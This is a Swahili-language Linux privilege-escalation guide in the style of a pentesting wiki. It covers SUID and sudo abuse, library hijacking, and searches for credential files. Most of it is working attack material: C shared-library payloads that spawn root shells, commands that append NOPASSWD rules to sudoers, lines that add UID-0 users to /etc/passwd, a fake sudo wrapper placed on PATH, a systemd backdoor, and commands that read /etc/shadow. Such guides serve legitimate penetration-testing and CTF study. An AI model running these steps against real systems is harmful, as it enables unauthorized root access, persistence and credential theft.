[Payload examples to execute.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID binary yenye command path

Ikiwa binary ya **suid** **inatekeleza command nyingine ikibainisha path**, basi unaweza kujaribu **ku-export function** yenye jina la command ambayo faili ya suid inaita.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_, unapaswa kujaribu kuunda function hiyo na kui-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapoiita suid binary, function hii itatekelezwa

### Script inayoweza kuandikwa inayoendeshwa na SUID wrapper

Miongoni mwa misconfiguration za kawaida za custom-app ni SUID binary wrapper inayomilikiwa na root na kuendesha script, huku script yenyewe ikiwa inaweza kuandikwa na low-priv users.

Muundo wa kawaida:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Ikiwa `/usr/local/bin/backup.sh` inaweza kuandikiwa, unaweza kuongeza amri za payload kisha utekeleze SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Ukaguzi wa haraka:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Njia hii ya attack hupatikana sana katika wrappers za "maintenance"/"backup" zinazosambazwa kwenye `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Environment variable ya **LD_PRELOAD** hutumika kubainisha shared libraries moja au zaidi (faili za .so) zitakazopakiwa na loader kabla ya nyingine zote, ikiwa ni pamoja na standard C library (`libc.so`). Mchakato huu hujulikana kama preloading library.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia feature hii kutumiwa vibaya, hasa katika executables za **suid/sgid**, mfumo huweka masharti fulani:

- Loader hupuuza **LD_PRELOAD** kwa executables ambazo real user ID (_ruid_) hailingani na effective user ID (_euid_).
- Kwa executables zilizo na suid/sgid, ni libraries zilizo katika standard paths na ambazo pia ni suid/sgid pekee ndizo hupakiwa.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kutekeleza commands kwa kutumia `sudo` na output ya `sudo -l` inajumuisha statement **env_keep+=LD_PRELOAD**. Configuration hii huruhusu environment variable ya **LD_PRELOAD** kuendelea kuwepo na kutambuliwa hata commands zinapoendeshwa kwa kutumia `sudo`, hali inayoweza kusababisha arbitrary code kutekelezwa kwa elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile it** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** ukiendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc inayofanana inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti env variable **LD_LIBRARY_PATH**, kwa sababu anadhibiti path ambayo libraries zitatumika kutafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** inayoonekana kuwa si ya kawaida, ni vyema kuthibitisha ikiwa inapakia faili za **.so** ipasavyo. Hili linaweza kuchunguzwa kwa kutekeleza command ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukumbana na kosa kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaashiria uwezekano wa exploitation.

Ili kutumia hili, mtu angeanza kwa kuunda faili la C, kwa mfano _"/path/to/.config/libcalc.c"_, lenye code ifuatayo:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, baada ya ku-compile na kutekelezwa, unalenga kuongeza privileges kwa kudhibiti file permissions na ku-execute shell yenye privileges za juu.

Compile faili ya C hapo juu kuwa shared object (.so) file kwa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha SUID binary iliyoathiriwa kunapaswa kuanzisha exploit, na hivyo kuwezesha uwezekano wa system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa kwa kuwa tumepata binary ya SUID inayopakia library kutoka kwenye folder ambalo tunaweza kuandikia, hebu tuunde library kwenye folder hilo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ukipata hitilafu kama vile
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyoratibiwa ya Unix binaries ambazo zinaweza kutumiwa na attacker kupita vikwazo vya local security. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa, lakini kwa hali ambapo unaweza **kuingiza arguments pekee** kwenye command.

Mradi huu hukusanya legitimate functions za Unix binaries ambazo zinaweza kutumiwa vibaya ili kutoroka restricted shells, kuongeza au kudumisha privileges zilizoinuliwa, kuhamisha files, kuanzisha bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l`, unaweza kutumia tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia ikiwa inapata njia ya kutumia vibaya sudo rule yoyote.

### Reusing Sudo Tokens

Katika hali ambapo una **sudo access** lakini huna password, unaweza kuongeza privileges kwa **kusubiri sudo command execution kisha kuteka session token**.

Mahitaji ya kuongeza privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" **ametumia `sudo`** kutekeleza kitu ndani ya **dakika 15 zilizopita** (kwa default hiyo ndiyo muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza password yoyote)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuweza ku-upload)

(Unaweza kuwezesha `ptrace_scope` kwa muda kwa kutumia `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kuibadilisha kabisa `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji haya yote yametimizwa, **unaweza kuongeza privileges ukitumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Exploit ya kwanza** (`exploit.sh`) itaunda binary `activate_sudo_token` ndani ya _/tmp_. Unaweza kuitumia **ku-activate sudo token katika session yako** (hutapata root shell automatically, tumia `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) **itaunda sh shell** katika _/tmp_ **inayomilikiwa na root ikiwa na setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Exploit ya tatu** (`exploit_v3.sh`) **itaunda faili la sudoers** linalofanya **tokens za sudo ziwe za kudumu na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **ruhusa za kuandika** kwenye folder au kwenye faili zozote zilizoundwa ndani ya folder hiyo, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) **kuunda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika upya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo yenye PID 1234, unaweza **kupata sudo privileges** bila kuhitaji kujua nenosiri kwa kutekeleza:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizo ndani ya `/etc/sudoers.d` husanidi ni nani anayeweza kutumia `sudo` na kwa njia gani. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na user root na group root**.\
**Ikiwa** unaweza **kusoma** faili hii, unaweza **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote, utaweza **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala wa binary ya `sudo`, kama vile `doas` kwa OpenBSD; kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Ikiwa `doas` inaruhusu editor au interpreter, angalia GTFOBins-style escapes:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Ikiwa unajua kwamba **user kwa kawaida huunganisha kwenye machine na kutumia `sudo`** ku-escalate privileges na umepata shell ndani ya context ya huyo user, unaweza **kuunda executable mpya ya sudo** ambayo ita-execute code yako kama root, kisha i-execute command ya user. Halafu, **badilisha $PATH** ya user context (kwa mfano, kwa kuongeza path mpya kwenye .bash_profile) ili user anapo-execute sudo, executable yako ya sudo i-execute.

Kumbuka kwamba ikiwa user anatumia shell tofauti (si bash), utahitaji kubadilisha files nyingine ili kuongeza path mpya. Kwa mfano, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) hubadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine kwenye [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kwa ku-run kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Faili `/etc/ld.so.conf` huonyesha **faili za configuration zilizopakiwa zinatoka wapi**. Kwa kawaida, faili hii huwa na path ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kuwa faili za configuration kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za configuration **huonyesha folda nyingine** ambako **libraries** zitatumika **kutafutwa**. Kwa mfano, maudhui ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kuwa mfumo utatafuta libraries ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu fulani **user ana permissions za kuandika** kwenye path yoyote iliyoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote iliyo ndani ya faili ya configuration kwenye `/etc/ld.so.conf.d/*.conf`, anaweza kupata uwezo wa kufanya privilege escalation.\
Tazama **jinsi ya kutumia vibaya misconfiguration hii** kwenye ukurasa ufuatao:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib kwenye `/var/tmp/flag15/`, litatumiwa na programu katika eneo hili kama ilivyobainishwa kwenye kigezo cha `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda library hasidi katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities hutoa **sehemu ndogo ya privileges za root zinazopatikana kwa process**. Hii hugawanya kwa ufanisi **privileges za root katika units ndogo na tofauti**. Kila moja ya units hizi inaweza kisha kupewa processes kwa kujitegemea. Kwa njia hii, seti kamili ya privileges hupunguzwa, na hivyo kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Ruhusa za directory

Katika directory, **bit ya "execute"** humaanisha kuwa user aliyeathiriwa anaweza kuingia kwenye folder kwa kutumia "**cd**".\
Bit ya **"read"** humaanisha kuwa user anaweza **kuorodhesha** **files**, na bit ya **"write"** humaanisha kuwa user anaweza **kufuta** na **kuunda** **files** mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha layer ya pili ya discretionary permissions, yenye uwezo wa **kubatilisha ugo/rwx permissions za kawaida**. Permissions hizi huongeza udhibiti wa access ya file au directory kwa kuruhusu au kukataa rights kwa users maalum ambao si owners au sehemu ya group. Kiwango hiki cha **granularity huhakikisha usimamizi sahihi zaidi wa access**. Maelezo zaidi yanaweza kupatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpe** user "kali" ruhusa za kusoma na kuandika kwenye file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zilizo na ACL maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor ya ACL iliyofichwa kwenye sudoers drop-ins

Usanidi usio sahihi wa kawaida ni faili inayomilikiwa na root katika `/etc/sudoers.d/` yenye mode `440`, ambayo bado inampa mtumiaji mwenye privileges chache ruhusa ya kuandika kupitia ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Ukiona kitu kama `user:alice:rw-`, mtumiaji anaweza kuongeza sudo rule licha ya mode bits zenye vikwazo:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Hii ni njia yenye athari kubwa ya ACL persistence/privesc kwa sababu ni rahisi kuikosa katika ukaguzi unaotegemea `ls -l` pekee.

## Open shell sessions

Katika **matoleo ya zamani**, unaweza **hijack** **shell** session ya mtumiaji mwingine (**root**).\
Katika **matoleo mapya zaidi**, utaweza **connect** kwenye screen sessions za **mtumiaji wako mwenyewe** pekee. Hata hivyo, unaweza kupata **taarifa muhimu ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Socket locations (baadhi ya mifumo huonyesha moja kama symlink ya nyingine): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Unganisha kwenye session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hili lilikuwa tatizo katika **old tmux versions**. Sikuweza kuhijack tmux (v2.1) session iliyoundwa na root kama mtumiaji asiye na privileges.

**Orodhesha tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Maeneo ya socket (baadhi ya systems huonyesha moja kama symlink ya nyingine) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Orodhesha kwa kutumia socket hiyo, unaweza kuanzisha tmux session kwenye socket hiyo...](<../../images/image (837).png>)

**Ambatisha kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box kutoka HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

SSL na SSH keys zote zilizozalishwa kwenye mifumo inayotegemea Debian (Ubuntu, Kubuntu, n.k.) kati ya Septemba 2006 na Mei 13, 2008 zinaweza kuathiriwa na bug hii.\
Bug hii husababishwa wakati wa kuunda ssh key mpya kwenye OS hizo, kwa kuwa **michanganyiko 32,768 pekee ndiyo iliwezekana**. Hii inamaanisha kuwa uwezekano wote unaweza kuhesabiwa na **ukiwa na ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Hubainisha ikiwa password authentication inaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Hubainisha ikiwa public key authentication inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaruhusiwa, hubainisha ikiwa server inaruhusu kuingia kwenye akaunti zilizo na password tupu. Chaguo-msingi ni `no`.

### Login control files

Files hizi huathiri nani anaweza kuingia na jinsi gani:

- **`/etc/nologin`**: ikiwa ipo, huzuia login za wasio-root na kuonyesha ujumbe wake.
- **`/etc/securetty`**: huzuia mahali ambapo root anaweza kuingia (TTY allowlist).
- **`/etc/motd`**: banner ya baada ya login (inaweza ku-leak maelezo ya environment au maintenance).

### PermitRootLogin

Hubainisha ikiwa root anaweza kuingia akitumia ssh; chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia akitumia password na private key
- `without-password` au `prohibit-password`: root anaweza kuingia tu kwa private key
- `forced-commands-only`: Root anaweza kuingia tu kwa private key na ikiwa commands options zimebainishwa
- `no` : hakuna

### AuthorizedKeysFile

Hubainisha files zilizo na public keys zinazoweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambazo zitabadilishwa na home directory. **Unaweza kubainisha absolute paths** (zinazoanza na `/`) au **relative paths kutoka home ya user**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Configuration hiyo itaonyesha kwamba ukijaribu ku-login kwa **private** key ya user "**testusername**", ssh italinganisha public key ya key yako na zile zilizo kwenye `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding hukuruhusu **kutumia SSH keys zako za kwenye local badala ya kuacha keys** (bila passphrases!) zikiwa kwenye server yako. Kwa hiyo, utaweza **kuruka** kupitia ssh **kwenda kwenye host** na kutoka hapo **kuruka kwenda kwenye** host nyingine **ukitumia** **key** iliyoko kwenye **initial host** yako.

Unahitaji kuweka option hii kwenye `$HOME/.ssh.config` kama hivi:
```
Host example.com
ForwardAgent yes
```
Notice kwamba ikiwa `Host` ni `*`, kila mara mtumiaji anaporukia mashine tofauti, host hiyo itaweza kufikia keys (ambalo ni tatizo la security).

Faili `/etc/ssh_config` inaweza **kubatilisha** **options** hizi na kuruhusu au kukataa configuration hii.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa kutumia keyword `AllowAgentForwarding` (default ni allow).

Ukigundua kwamba Forward Agent imewekwa katika environment, soma ukurasa ufuatao kwa sababu **unaweza kuweza kuitumia vibaya ili kuongeza privileges**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Faili za Kuvutia

### Faili za Profile

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripts zinazotekelezwa mtumiaji anapoendesha shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kurekebisha yoyote kati yake, unaweza kuongeza privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa profile script yoyote isiyo ya kawaida itapatikana, unapaswa kuikagua kwa ajili ya **taarifa nyeti**.

### Faili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kutumia jina tofauti au kunaweza kuwa na backup. Kwa hivyo inapendekezwa **uzitafute zote** na **uangalie ikiwa unaweza kuzisoma** ili kuona **ikiwa kuna hashes** ndani ya faili hizo:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili la `/etc/passwd` (au linalolingana nalo)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd Inayoweza kuandikwa

Kwanza, tengeneza nenosiri kwa kutumia mojawapo ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Kisha ongeza mtumiaji `hacker` na uongeze nenosiri lililotengenezwa.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` kwa `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji dummy bila nenosiri.\
ONYO: unaweza kupunguza usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
KUMBUKA: Katika majukwaa ya BSD, `/etc/passwd` iko kwenye `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imepewa jina jipya la `/etc/spwd.db`.

Unapaswa kuangalia ikiwa unaweza **kuandika kwenye baadhi ya mafaili nyeti**. Kwa mfano, unaweza kuandika kwenye **faili fulani la usanidi wa service**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha **tomcat** server na unaweza **kurekebisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kurekebisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa wakati tomcat itakapoanzishwa tena.

### Kagua Folda

Folda zifuatazo zinaweza kuwa na nakala rudufu au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hutaweza kusoma ya mwisho, lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Faili za Maeneo/Miliki Yasiyo ya Kawaida
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizorekebishwa katika dakika za mwisho
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za DB za Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml faili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web files**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Nakala za Kuhifadhi**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zenye nywila

Soma code ya [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), hutafuta **faili kadhaa zinazowezekana kuwa na nywila**.\
**Tool nyingine ya kuvutia** unayoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), ambayo ni application ya open source inayotumika kurejesha nywila nyingi zilizohifadhiwa kwenye computer ya ndani kwa Windows, Linux na Mac.

### Logs

Ikiwa unaweza kusoma logs, huenda ukaweza kupata **taarifa za kuvutia/za siri ndani yake**. Kadiri log inavyokuwa ya kushangaza, ndivyo itakavyokuwa ya kuvutia zaidi (pengine).\
Pia, baadhi ya **audit logs** zilizosanidiwa "**vibaya**" (zilizo na backdoor?) zinaweza kukuruhusu **kurekodi nywila** ndani ya audit logs kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logs, group** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) itakuwa muhimu sana.

### Faili za Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kuangalia files zilizo na neno "**password**" kwenye **name** yake au ndani ya **content**, na pia kuangalia IPs na emails ndani ya logs, au hashes regexps.\
